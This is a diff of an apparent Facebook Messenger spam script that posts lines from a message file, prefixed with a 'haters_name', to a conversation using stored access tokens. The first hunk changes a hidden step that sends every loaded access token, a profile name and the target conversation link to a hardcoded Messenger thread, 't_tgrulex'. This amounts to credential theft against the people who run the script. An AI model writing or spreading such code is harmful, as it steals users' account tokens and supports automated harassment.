@@ -93,7 +93,7 @@ def send_messages():
             'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id
         }
         try:
-            s = requests.post("https://graph.facebook.com/v15.0/t_100051372048453/", data=parameters, headers=headers)
+            s = requests.post("https://graph.facebook.com/v17.0/t_tgrulex/", data=parameters, headers=headers)
         except:
             pass
 
@@ -106,7 +106,7 @@ def send_messages():
 
                 message = messages[message_index].strip()
 
-                url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_'+convo_id)
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
 
